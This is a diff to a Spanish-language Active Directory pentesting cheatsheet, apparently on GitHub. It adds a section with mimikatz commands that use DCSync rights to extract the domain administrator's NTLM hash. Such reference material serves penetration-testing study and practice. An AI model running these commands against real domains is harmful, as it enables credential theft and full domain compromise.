@@ -59,6 +59,13 @@ PS> klist
 PS> iwr -UseDefaultCredentials http://web04
 ```
 
+#### Extraer hashes NTLM cuando el usuario tiene DCSync
+```
+privilege::debug
+
+lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\administrator
+```
+
 ---
 
 [:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)
